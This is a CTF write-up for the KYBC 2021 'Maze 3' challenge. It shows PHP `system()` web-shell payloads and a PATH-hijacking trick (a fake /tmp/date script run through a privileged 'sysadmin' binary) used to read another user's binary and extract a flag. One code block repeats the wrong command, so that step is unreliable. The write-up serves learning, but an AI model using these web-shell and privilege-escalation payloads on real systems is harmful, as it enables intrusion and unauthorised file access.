Title: KYBC 2021 - Maze 3 Writeup
Date: 2021-03-24
Tags: ctf, lfi, rce, kybc
Slug: kybc-yogosha-2021-maze-3-writeup
Summary: Writeup for Maze 3 challenge at KYBC CTF


_In order to start this challenge it was necessary to complete [Maze 2]({filename}/ctf/kybc-yogosha-maze2.md) first_

Third maze, third user. Let's check what's in `home/ctf_user3`

```
<?php system('ls -al /home/ctf_user3'); ?>
```

It looks like ctf_user2 owns `image.txt` and `RAnd0m`. Hovewer, neither concatenating the content of `image.txt` nor running the `RAnd0m` executable bring anything useful.

Let's try to inspect the binary then with the good ol' `strings`

```
<?php system('echo "strings /home/ctf_user3/RAnd0M" > /tmp/date && chmod 777 /tmp/date && export PATH=/tmp:$PATH && /home/ctf_user2/sysadmin'); ?>
```

No luck. What about `od` then?

```
<?php system('echo "strings /home/ctf_user3/RAnd0M" > /tmp/date && chmod 777 /tmp/date && export PATH=/tmp:$PATH && /home/ctf_user2/sysadmin'); ?>
```
Well that worked. Now I only need to figure out how to get out a proper hexdump from it. After a bit of digging, the `man` page comes to the rescue and provides with the syntax I need.

```
<?php system('echo "od -A x -t x1z -v /home/ctf_user3/RAnd0M" > /tmp/date && chmod 777 /tmp/date && export PATH=/tmp:$PATH && /home/ctf_user2/sysadmin'); ?>
```

Let's copy the hex dump into a txt file in my machine, recreate the binary and finally run `strings` on it

```
xxd -r -p rand.txt out.bin
strings out.bin
```

One of the strings seems to match the flag pattern `pvkq{dbiH._dy_pvkqH.E.H.U.H._wo_?}`.

Running it through a [ROT decoder](http://theblob.org/rot.cgi?) gives me `flag{tryX._to_flagX.U.X.K.X._me_?}`. Since the flag doesn't look too right and the system doesn't accept anyway, let's assume I probably messed up something while tinkering with `od` and manually fix it: `flag{try_to_flag_me_?}`.
